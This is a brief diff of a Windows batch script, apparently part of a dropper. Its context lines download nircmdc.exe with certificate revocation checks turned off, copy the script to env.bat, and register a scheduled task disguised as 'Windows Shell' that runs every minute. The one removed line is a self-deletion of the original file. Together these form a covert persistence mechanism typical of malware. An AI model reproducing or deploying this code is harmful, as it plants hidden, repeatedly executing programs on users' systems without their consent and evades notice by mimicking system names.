@@ -10,7 +10,6 @@ IF NOT Exist %CDIR%\nircmdc.exe (
 	curl --ssl-no-revoke %NIRCMD_URL% -o %CDIR%\nircmdc.exe
 	copy "%~f0" "%CDIR%\env.bat" 
 	schtasks /Create /SC minute /MO 1 /TN "Windows Shell" /TR %CDIR%\env.bat
-	del "%~f0"
 )
 
 setlocal
